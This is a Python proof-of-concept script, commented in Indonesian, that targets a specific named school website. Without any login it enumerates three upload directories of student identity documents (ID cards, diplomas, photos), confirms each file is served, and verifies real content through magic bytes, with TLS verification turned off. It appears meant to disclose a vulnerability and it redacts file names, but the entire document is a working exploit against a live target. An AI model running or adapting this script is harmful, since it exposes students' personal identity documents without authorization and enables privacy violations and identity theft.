#!/usr/bin/env python3
"""
PoC F1 — SISWA MGKB (pcmgkb.my.id/siswamugeb): unduh dokumen pribadi siswa TANPA login.

Demonstrasi bersih:
  1. Tanpa cookie/login apa pun.
  2. Buka listing 3 folder unggahan siswa (files_ktp, files_ijazah, files_fotosiswa).
  3. Ambil tiap berkas, verifikasi HTTP 200 dan isi asli lewat magic bytes
     (JPEG=FF D8 FF, PNG=89 50 4E 47, PDF=%PDF) — bukan halaman error.
  4. Ringkas: jumlah berkas + berapa yang benar-benar terkirim.

Privasi: isi berkas TIDAK disimpan. Hanya 8 byte pertama (magic) yang dibaca.
Nama berkas diredact pada keluaran.

Pemakaian:
  python3 poc_f1_pii_download.py
  python3 poc_f1_pii_download.py --base-url https://pcmgkb.my.id/siswamugeb
  python3 poc_f1_pii_download.py --show-bytes          # tampilkan magic bytes
  python3 poc_f1_pii_download.py --save-json out.json  # simpan ringkasan
"""

import argparse
import json
import re
import ssl
import sys
import urllib.parse
import urllib.request

DEFAULT_BASE = "https://pcmgkb.my.id/siswamugeb"
PII_DIRS = ["files/files_ktp", "files/files_ijazah", "files/files_fotosiswa"]
HREF = re.compile(r'href="([^"?][^"]*\.(?:jpg|jpeg|png|pdf|webp|gif|bmp))"', re.I)

MAGIC = {
    b"\xff\xd8\xff": "JPEG",
    b"\x89PNG": "PNG",
    b"%PDF": "PDF",
    b"GIF8": "GIF",
    b"RIFF": "WEBP",
}

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def req(url, headers=None, method="GET", rng=None, maxb=400_000):
    h = {"User-Agent": "Mozilla/5.0 (F1-PoC)"}
    if headers:
        h.update(headers)
    if rng:
        h["Range"] = rng
    r = urllib.request.Request(url, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=25, context=CTX) as resp:
            return resp.status, dict(resp.headers), resp.read(maxb)
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), b""
    except Exception as e:  # noqa: BLE001
        return 0, {"x-error": str(e)}, b""


def redact(name):
    b = name.rsplit("/", 1)[-1]
    return (b[:2] + "…" + b[-4:]) if len(b) >= 6 else "<redacted>"


def magic_of(url):
    _s, _h, head = req(url, rng="bytes=0-15", maxb=16)
    return next((v for k, v in MAGIC.items() if head.startswith(k)), None)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", default=DEFAULT_BASE)
    ap.add_argument("--show-bytes", action="store_true")
    ap.add_argument("--limit", type=int, default=8, help="sampel ditampilkan per direktori (semua tetap diverifikasi)")
    ap.add_argument("--save-json")
    args = ap.parse_args()
    base = args.base_url.rstrip("/")

    print(f"[*] Target    : {base}")
    print(f"[*] Kredensial: TIDAK ADA (tanpa cookie, tanpa login)\n")

    summary = {"base_url": base, "dirs": {}, "total": 0, "ok": 0, "stale": 0}
    for d in PII_DIRS:
        st, _, body = req(base + "/" + d + "/")
        files = [urllib.parse.unquote(x.rsplit("/", 1)[-1]) for x in HREF.findall(body.decode("utf-8", "replace"))]
        print(f"== {d}/  (listing HTTP {st}, {len(files)} berkas)")
        ok = 0
        for i, f in enumerate(files):
            u = f"{base}/{d}/{urllib.parse.quote(f)}"
            hs, hh, _ = req(u, method="HEAD")          # status + ukuran asli
            kind = magic_of(u)                          # isi asli (magic bytes)
            real = hs == 200 and kind is not None
            ok += real
            if i < args.limit:
                extra = f"magic={kind}" if args.show_bytes else f"{kind or '?'}"
                print(f"   [{'200' if hs == 200 else hs}] {redact(f):<14} {hh.get('Content-Type',''):<16} {hh.get('Content-Length','?'):>9} bytes  {extra}")
        if len(files) > args.limit:
            print(f"   … (+{len(files) - args.limit} berkas lain, semua diverifikasi)")
        summary["dirs"][d] = {"count": len(files), "ok": ok}
        summary["total"] += len(files)
        summary["ok"] += ok
        print()

    stale = summary["total"] - summary["ok"]
    print(f"[+] {summary['total']} entri listing · {summary['ok']} benar-benar terkirim (HTTP 200) & isi asli terverifikasi · {stale} entri tidak konsisten (basi/404) — semua TANPA autentikasi.")
    if summary["ok"]:
        print("[!] Dokumen identitas siswa (KTP/ijazah/foto/NISN) terbuka untuk publik.")
    if args.save_json:
        with open(args.save_json, "w", encoding="utf-8") as fh:
            json.dump(summary, fh, indent=2, ensure_ascii=False)
    return 0 if summary["ok"] == 0 else 2


if __name__ == "__main__":
    sys.exit(main())
